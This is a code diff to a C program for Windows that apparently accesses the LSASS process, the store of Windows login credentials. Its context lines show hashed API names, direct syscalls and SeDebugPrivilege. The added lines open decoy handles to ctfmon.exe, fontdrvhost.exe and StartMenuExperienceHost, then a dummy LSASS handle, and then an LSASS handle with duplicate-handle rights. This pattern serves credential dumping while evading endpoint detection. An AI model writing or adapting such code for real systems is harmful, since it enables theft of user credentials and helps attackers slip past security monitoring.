@@ -11,9 +11,20 @@ int main() {
     PVOID   pAddress  = NULL;
     SIZE_T  memSize   = 4096;
 
+
     DWORD   dwLSASSId = 0;
     HANDLE  hLSASS    = NULL;
+    DWORD   dwDummyLSASSId = 0;
+    HANDLE  hDummyLSASS    = NULL;
 
+
+    ULONG procArray[] = {
+            HASHW(L"ctfmon.exe"),
+            HASHW(L"fontdrvhost.exe"),
+            HASHW(L"StartMenuExpericenHost.exe")
+    };
+
+    HANDLE handleArray[sizeof(procArray)];
 
     AddWin32uToIat();
     if (!InitSyscalls()) {
@@ -24,7 +35,15 @@ int main() {
         printf("[!] Failed to set SeDebugPrivilege\n");
     }
 
-    if (!GetProcessHandle(HASHW(L"lsass.exe"), &dwLSASSId, &hLSASS)) {
+    for (DWORD i = 0; i < (sizeof(procArray) / sizeof(procArray[0])); ++i) {
+        DWORD dwTmp = 0;
+        handleArray[i] = NULL;
+        OpenProcessHandle(procArray[i], &dwTmp, &handleArray[i], PROCESS_QUERY_INFORMATION);
+    }
+
+    OpenProcessHandle(HASHW(L"lsass.exe"), &dwDummyLSASSId, &hDummyLSASS, PROCESS_QUERY_INFORMATION);
+
+    if (!OpenProcessHandle(HASHW(L"lsass.exe"), &dwLSASSId, &hLSASS, PROCESS_DUP_HANDLE)) {
         printf("[!] Failed to get process handle\n");
     }
 
